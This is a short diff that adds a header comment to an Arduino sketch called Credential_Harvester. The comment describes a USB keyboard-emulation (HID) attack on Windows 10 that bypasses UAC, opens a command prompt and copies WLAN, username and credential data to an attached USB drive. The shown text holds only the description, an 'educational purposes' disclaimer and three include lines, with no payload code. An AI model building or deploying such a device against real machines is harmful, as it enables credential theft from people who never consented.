@@ -1,3 +1,20 @@
+/*C++
+
+Author: graylagx2
+
+Name: Credential_Harvester
+
+Description:        This arduino sketch uses the Adafruit Attiny85 TrinketKeyboard library 
+                    to carry out a HID attack on a Windows 10 machine. The attack uses 
+                    additional usb storage device to save data on once thd attack is
+                    complete. The attack itself open a command prompt bypassing UAC
+                    then retrieves the WLAN interface network data, Username, and Credentials.
+
+Disclaimer:         This is open source from https://github.com/graylagx2 and is intended only for educarional
+                    purposes. Use in a controlled environment only. By using this sofware you agree you are 
+                    responsible for any laws toy break.                             
+*/
+
 #include <cmdline_defs.h>
 #include <TrinketKeyboard.h>
 #include <TrinketKeyboardC.h>
